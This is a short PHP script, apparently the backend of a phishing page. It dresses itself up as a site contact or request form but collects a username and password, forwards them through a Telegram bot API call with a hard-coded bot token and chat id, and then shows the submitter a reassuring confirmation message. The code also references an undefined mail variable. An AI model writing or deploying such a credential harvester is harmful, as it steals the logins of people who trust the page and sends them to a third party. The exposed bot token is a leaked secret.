<?php
if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    exit();
}

// Сайт
$site = 'Timekeaper.сайт';
// Тема письма
$subject = 'Заявка с сайта '.$site.'!';
// От кого
$from = 'form@'.$site;
// Кому
$to = 'info@'.$site;

//В переменную $token нужно вставить id вашего бота
$token = "6910522612:AAESF7URCow9uA2xYTbVF31sDJIxJIkIl68";
//В chat_id вставляем id группы
$chat_id = "-4267869539";

var_dump($_POST);
if ( ! empty( $_POST ) ) {
    $uname  = htmlspecialchars($_POST['uname']);
    $psw  = htmlspecialchars($_POST['psw']);

    // Тело сообщения для отправки по почте
    $message = "Логин: $uname \r\n";
    $message .= "Пароль: $psw \r\n";

    //Тело сообщения для отправки в телеграмм
    $txt = "Логин: $uname %0A";
    $txt .= "Пароль: $psw %0A";

    try {
        $headers = 'From: form@'.$site."\r\n".
                'X-Mailer: PHP/' . phpversion();
        //Передаем сообщение в телеграмм
        $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

        if ( $mail && $sendToTelegram ) {
            echo json_encode('Спасибо! Ваша заявка принята. Мы свяжемся с вами в ближайшее время.');
        } else {
            echo json_encode('Ошибка отправки!');
        }

        die();

    } catch (Exception $e) {
        echo json_encode("Ошибка: $e->getMessage()");
    }
} else {
    echo json_encode("Тело сообщения пустое");
}
?>